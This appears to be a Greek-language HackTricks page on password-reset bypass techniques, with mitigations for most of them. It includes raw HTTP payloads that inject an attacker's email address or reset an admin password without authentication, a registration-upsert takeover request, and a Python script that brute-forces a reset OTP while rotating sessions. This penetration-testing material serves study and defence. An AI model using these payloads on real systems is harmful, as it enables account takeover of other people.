# Παράκαμψη Επαναφοράς/Ξεχασμένου Κωδικού

{{#include ../banners/hacktricks-training.md}}

## **Token επαναφοράς κωδικού Leak Via Referrer**

- Το HTTP referer header μπορεί να leak το token επαναφοράς κωδικού αν περιλαμβάνεται στο URL. Αυτό μπορεί να συμβεί όταν ένας χρήστης κάνει κλικ σε σύνδεσμο ιστοτόπου τρίτου μετά από αίτημα επαναφοράς κωδικού.
- **Επίπτωση**: Πιθανή ανάληψη λογαριασμού μέσω Cross-Site Request Forgery (CSRF).
- **Εκμετάλλευση**: Για να ελέγξετε αν ένα token επαναφοράς κωδικού leak στο referer header, **ζητήστε επαναφορά κωδικού** στη διεύθυνση email σας και **κάντε κλικ στον παρεχόμενο σύνδεσμο επαναφοράς**. **Μην αλλάξετε αμέσως τον κωδικό σας**. Αντίθετα, **πλοηγηθείτε σε έναν ιστότοπο τρίτου** (όπως Facebook ή Twitter) ενώ **intercepting the requests using Burp Suite**. Εξετάστε τα αιτήματα για να δείτε αν το **referer header περιέχει το token επαναφοράς κωδικού**, καθώς αυτό μπορεί να εκθέσει ευαίσθητες πληροφορίες σε τρίτους.
- **References**:
- [HackerOne Report 342693](https://hackerone.com/reports/342693)
- [HackerOne Report 272379](https://hackerone.com/reports/272379)
- [Password Reset Token Leak Article](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)

## **Password Reset Poisoning**

- Οι επιτιθέμενοι μπορεί να χειριστούν το Host header κατά τα αιτήματα επαναφοράς κωδικού ώστε ο σύνδεσμος επαναφοράς να δείχνει σε κακόβουλο ιστότοπο.
- **Επίπτωση**: Οδηγεί σε πιθανή ανάληψη λογαριασμού με leaking των reset tokens στους επιτιθέμενους.
- **Βήματα μετριασμού**:
- Επαληθεύστε το Host header έναντι μιας whitelist επιτρεπόμενων domains.
- Χρησιμοποιήστε ασφαλείς, server-side μεθόδους για να δημιουργείτε απόλυτα URLs.
- **Patch**: Use `$_SERVER['SERVER_NAME']` to construct password reset URLs instead of `$_SERVER['HTTP_HOST']`.
- **References**:
- [Acunetix Article on Password Reset Poisoning](https://www.acunetix.com/blog/articles/password-reset-poisoning/)

## **Επαναφορά κωδικού με χειρισμό της παραμέτρου email**

Οι επιτιθέμενοι μπορούν να χειριστούν το αίτημα επαναφοράς κωδικού προσθέτοντας επιπλέον παραμέτρους email για να αποπροσανατολίσουν τον σύνδεσμο επαναφοράς.

- Προσθέστε το email του επιτιθέμενου ως δεύτερη παράμετρο χρησιμοποιώντας &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
- Πρόσθεσε το attacker email ως δεύτερη παράμετρο χρησιμοποιώντας %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
- Προσθέστε attacker email ως δεύτερη παράμετρο χρησιμοποιώντας |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
- Προσθέστε το attacker email ως δεύτερη παράμετρο χρησιμοποιώντας cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
- Πρόσθεσε το attacker email ως δεύτερη παράμετρο, χρησιμοποιώντας bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
- Προσθέστε το attacker email ως δεύτερη παράμετρο χρησιμοποιώντας ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
- Προσθέστε attacker email ως δεύτερη παράμετρο σε json array
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
- **Βήματα αντιμετώπισης**:
- Επεξεργαστείτε και επικυρώστε σωστά τις παραμέτρους email στο server.
- Χρησιμοποιήστε prepared statements ή parameterized queries για να αποτρέψετε injection attacks.
- **Αναφορές**:
- [https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be](https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be)
- [https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/](https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/)
- [https://twitter.com/HusseiN98D/status/1254888748216655872](https://twitter.com/HusseiN98D/status/1254888748216655872)

## **Αλλαγή Email και Password οποιουδήποτε χρήστη μέσω παραμέτρων API**

- Οι επιτιθέμενοι μπορούν να τροποποιήσουν τις παραμέτρους email και password σε αιτήματα API για να αλλάξουν τα account credentials.
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
- **Βήματα μετριασμού**:
- Διασφαλίστε αυστηρό έλεγχο παραμέτρων και ελέγχους πιστοποίησης.
- Εφαρμόστε αξιόπιστο logging και monitoring για την ανίχνευση και αντιμετώπιση ύποπτων ενεργειών.
- **Reference**:
- [Full Account Takeover via API Parameter Manipulation](https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240)

## **No Rate Limiting: Email Bombing**

- Η έλλειψη rate limiting σε password reset requests μπορεί να οδηγήσει σε email bombing, υπερφορτώνοντας τον χρήστη με reset emails.
- **Βήματα μετριασμού**:
- Εφαρμόστε rate limiting βάσει IP address ή user account.
- Χρησιμοποιήστε CAPTCHA challenges για την αποτροπή αυτοματοποιημένης κατάχρησης.
- **References**:
- [HackerOne Report 280534](https://hackerone.com/reports/280534)

## **Find out How Password Reset Token is Generated**

- Η κατανόηση του pattern ή της μεθόδου πίσω από την παραγωγή του token μπορεί να οδηγήσει στην πρόβλεψη ή στο brute-forcing των tokens. Μερικές επιλογές:
- Βασισμένο σε Timestamp
- Βασισμένο στο UserID
- Βασισμένο στο email του User
- Βασισμένο στο Firstname και Lastname
- Βασισμένο στην Date of Birth
- Βασισμένο σε Cryptography
- **Βήματα μετριασμού**:
- Χρησιμοποιήστε ισχυρές, κρυπτογραφικές μεθόδους για την παραγωγή token.
- Εξασφαλίστε επαρκή randomness και μήκος για να αποτρέψετε την προβλεψιμότητα.
- **Εργαλεία**: Χρησιμοποιήστε Burp Sequencer για να αναλύσετε την τυχαιότητα των tokens.

## **Guessable UUID**

- Αν τα UUIDs (version 1) είναι guessable ή predictable, οι επιτιθέμενοι μπορεί να τα brute-force για να δημιουργήσουν έγκυρα reset tokens. Έλεγχος:


{{#ref}}
uuid-insecurities.md
{{#endref}}

- **Βήματα μετριασμού**:
- Χρησιμοποιήστε GUID version 4 για randomness ή εφαρμόστε επιπλέον μέτρα ασφαλείας για άλλες versions.
- **Εργαλεία**: Χρησιμοποιήστε [guidtool](https://github.com/intruder-io/guidtool) για ανάλυση και δημιουργία GUIDs.

## **Response Manipulation: Replace Bad Response With Good One**

- Παραποίηση HTTP responses για παράκαμψη error messages ή περιορισμών.
- **Βήματα μετριασμού**:
- Εφαρμόστε server-side ελέγχους για να διασφαλίσετε την ακεραιότητα των responses.
- Χρησιμοποιήστε secure communication channels όπως HTTPS για να αποτρέψετε man-in-the-middle attacks.
- **Reference**:
- [Critical Bug in Live Bug Bounty Event](https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3)

## **Using Expired Token**

- Δοκιμή κατά πόσον expired tokens μπορούν ακόμα να χρησιμοποιηθούν για password reset.
- **Βήματα μετριασμού**:
- Εφαρμόστε αυστηρές πολιτικές expiration των token και επικυρώστε την expiry server-side.

## **Brute Force Password Reset Token**

- Επιχείρηση brute-force του reset token χρησιμοποιώντας εργαλεία όπως Burpsuite και IP-Rotator για την παράκαμψη των IP-based rate limits.
- **Βήματα μετριασμού**:
- Εφαρμόστε ισχυρό rate-limiting και μηχανισμούς account lockout.
- Παρακολουθήστε για ύποπτες ενέργειες που υποδηλώνουν brute-force attacks.

## **Try Using Your Token**

- Δοκιμή αν το reset token ενός attacker μπορεί να χρησιμοποιηθεί σε συνδυασμό με το email του θύματος.
- **Βήματα μετριασμού**:
- Διασφαλίστε ότι τα tokens είναι δεμένα με το user session ή άλλα user-specific attributes.

## **Session Invalidation in Logout/Password Reset**

- Εξασφαλίστε ότι τα sessions invalidated όταν ένας χρήστης κάνει logout ή αλλάξει password.
- **Βήματα μετριασμού**:
- Εφαρμόστε σωστή session management, διασφαλίζοντας ότι όλα τα sessions invalidated κατά το logout ή το password reset.

## **Session Invalidation in Logout/Password Reset**

- Τα reset tokens θα πρέπει να έχουν χρόνο λήξης μετά τον οποίο γίνονται invalid.
- **Βήματα μετριασμού**:
- Ορίστε λογικό expiration time για τα reset tokens και επιβάλετέ το αυστηρά server-side.

## **OTP rate limit bypass by changing your session**

- Αν η ιστοσελίδα χρησιμοποιεί user session για την παρακολούθηση λανθασμένων OTP προσπαθειών και το OTP είναι αδύναμο (<= 4 digits) τότε μπορούμε ουσιαστικά να bruteforce το OTP.
- **εξακρίβωση/επεκτάσεις**:
- Απλά αιτηθείτε ένα νέο session token μετά το μπλοκάρισμα από το server.
- **Example** code που εκμεταλλεύεται αυτό το bug με τυχαίες εικασίες του OTP (όταν αλλάζετε session το OTP θα αλλάζει επίσης, οπότε δεν μπορούμε να το brute-force σειριακά!):

``` python
# Authentication bypass by password reset
# by coderMohammed
import requests
import random
from time import sleep

headers = {
"User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
"Cookie": "PHPSESSID=mrerfjsol4t2ags5ihvvb632ea"
}
url = "http://10.10.12.231:1337/reset_password.php"
logout = "http://10.10.12.231:1337/logout.php"
root = "http://10.10.12.231:1337/"

parms = dict()
ter = 0
phpsessid = ""

print("[+] Starting attack!")
sleep(3)
print("[+] This might take around 5 minutes to finish!")

try:
while True:
parms["recovery_code"] = f"{random.randint(0, 9999):04}" # random number from 0 - 9999 with 4 d
parms["s"] = 164 # not important it only efects the frontend
res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)

if ter == 8: # follow number of trails
out = requests.get(logout,headers=headers) # log u out
mainp = requests.get(root) # gets another phpssid (token)

cookies = out.cookies # extract the sessionid
phpsessid = cookies.get('PHPSESSID')
headers["cookies"]=f"PHPSESSID={phpsessid}" #update the headers with new session

reset = requests.post(url, data={"email":"tester@hammer.thm"}, allow_redirects=True, verify=False, headers=headers) # sends the email to change the password for
ter = 0 # reset ter so we get a new session after 8 trails
else:
ter += 1
if(len(res.text) == 2292): # this is the length of the page when u get the recovery code correctly (got by testing)
print(len(res.text)) # for debug info
print(phpsessid)

reset_data = { # here we will change the password to somthing new
"new_password": "D37djkamd!",
"confirm_password": "D37djkamd!"
}
reset2 = requests.post(url, data=reset_data, allow_redirects=True, verify=False, headers=headers)

print("[+] Password has been changed to:D37djkamd!")
break
except Exception as e:
print("[+] Attck stopped")
```

## Arbitrary password reset via skipOldPwdCheck (pre-auth)

Κάποιες υλοποιήσεις εκθέτουν μια ενέργεια αλλαγής password που καλεί τη ρουτίνα αλλαγής password με skipOldPwdCheck=true και δεν επαληθεύει κανένα reset token ή ιδιοκτησία. Εάν το endpoint δέχεται ένα parameter action όπως change_password και ένα username/new password στο request body, ένας attacker μπορεί να επαναφέρει αυθαίρετους λογαριασμούς pre-auth.

Vulnerable pattern (PHP):
```php
// hub/rpwd.php
RequestHandler::validateCSRFToken();
$RP = new RecoverPwd();
$RP->process($_REQUEST, $_POST);

// modules/Users/RecoverPwd.php
if ($request['action'] == 'change_password') {
$body = $this->displayChangePwd($smarty, $post['user_name'], $post['confirm_new_password']);
}

public function displayChangePwd($smarty, $username, $newpwd) {
$current_user = CRMEntity::getInstance('Users');
$current_user->id = $current_user->retrieve_user_id($username);
// ... criteria checks omitted ...
$current_user->change_password('oldpwd', $_POST['confirm_new_password'], true, true); // skipOldPwdCheck=true
emptyUserAuthtokenKey($this->user_auth_token_type, $current_user->id);
}
```
Αίτημα εκμετάλλευσης (έννοια):
```http
POST /hub/rpwd.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=change_password&user_name=admin&confirm_new_password=NewP@ssw0rd!
```
Μέτρα αντιμετώπισης:
- Απαιτείτε πάντα ένα έγκυρο, χρονικά οριοθετημένο reset token συνδεδεμένο με τον λογαριασμό και τη συνεδρία πριν την αλλαγή του κωδικού.
- Μην εκθέτετε ποτέ τις διαδρομές skipOldPwdCheck σε μη πιστοποιημένους χρήστες· επιβάλετε έλεγχο ταυτότητας για τις κανονικές αλλαγές κωδικού και επαληθεύστε τον παλιό κωδικό.
- Ακυρώστε όλες τις ενεργές συνεδρίες και τα reset tokens μετά την αλλαγή κωδικού.

## Εγγραφή ως Επαναφορά Κωδικού (Upsert σε υπάρχον email)

Ορισμένες εφαρμογές υλοποιούν τον signup handler ως upsert. Αν το email υπάρχει ήδη, ο handler ενημερώνει σιωπηλά την εγγραφή του χρήστη αντί να απορρίψει το αίτημα. Όταν το registration endpoint δέχεται ένα ελάχιστο JSON σώμα με υπάρχον email και νέο password, στην πράξη γίνεται επαναφορά κωδικού πριν την αυθεντικοποίηση χωρίς καμία επαλήθευση ιδιοκτησίας, επιτρέποντας πλήρη κατάληψη του λογαριασμού.

Pre-auth ATO PoC (επανεγγραφή του κωδικού υπάρχοντος χρήστη):
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
## Αναφορές

- [https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token](https://anugrahsr.github.io/posts/10-Password-reset-flaws/#10-try-using-your-token)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)

{{#include ../banners/hacktricks-training.md}}
